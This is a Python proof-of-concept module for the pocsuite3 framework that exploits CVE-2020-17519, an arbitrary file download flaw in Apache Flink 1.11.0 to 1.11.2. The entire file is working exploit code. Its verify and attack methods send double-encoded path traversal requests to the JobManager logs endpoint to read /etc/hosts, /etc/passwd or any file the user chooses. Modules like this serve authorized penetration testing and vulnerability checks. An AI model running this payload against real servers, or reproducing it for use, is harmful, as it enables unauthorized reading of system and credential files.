# encoding: utf-8
# Author    : Sma11stu
# Datetime  : 2021/5/15 17:34
# Product   : PyCharm
# Project   : pocsuite3
# File      : apache_flink_cve_2020_17519_download.py
# explain   : 文件说明
import re
import base64
from collections import OrderedDict
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from urllib.parse import quote

class DemoPOC(POCBase):
    vulID = 'xxx'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2021-05-15'
    createDate = '2021-05-15'
    updateDate = '2021-05-15'
    references = ['https://paper.seebug.org/705/']
    name = 'CVE-2020-17519 Apache Flink 文件下载漏洞'
    appPowerLink = ''
    appName = 'Apache Flink'
    appVersion = '1.11.0、1.11.1、1.11.2'
    vulType = VUL_TYPE.ARBITRARY_FILE_DOWNLOAD
    desc = '''
        CVE-2020-17519 Apache Flink 文件下载漏洞
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["filename"] = OptString('', description='下载文件名称', require=False)
        return o

    def _verify(self):
        result = {}
        try:
            Flag_error = "This file does not exist in JobManager log dir"
            verify_payload = '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fhosts'
            verify_url = self.url + verify_payload
            logger.info(verify_url)
            verify_res = requests.get(verify_url,verify=False)
            if verify_res.status_code ==200 and Flag_error not in verify_res.content.decode():
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = verify_url
                result['VerifyInfo']['Payload'] = verify_payload
                result['VerifyInfo']['File_Content'] = '\n'+ verify_res.content.decode()
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        result = {}
        try:
            Flag_error = "This file does not exist in JobManager log dir"
            if self.get_option("filename"):
                attack_filename = quote(quote(self.get_option("filename"),'utf-8'))
            else:
                attack_filename = quote(quote("/etc/passwd",'utf-8'))
            logger.info("下载文件为：" + attack_filename)
            attack_payload = '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..' + attack_filename
            attack_url = self.url + attack_payload
            logger.info(attack_url)
            attack_res = requests.get(attack_url,verify=False)
            if attack_res.status_code ==200 and Flag_error not in attack_res.content.decode():
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = attack_url
                result['VerifyInfo']['Payload'] = attack_payload
                result['VerifyInfo']['File_Content'] = '\n' + attack_res.content.decode()
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _shell(self):
        return self._attack()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)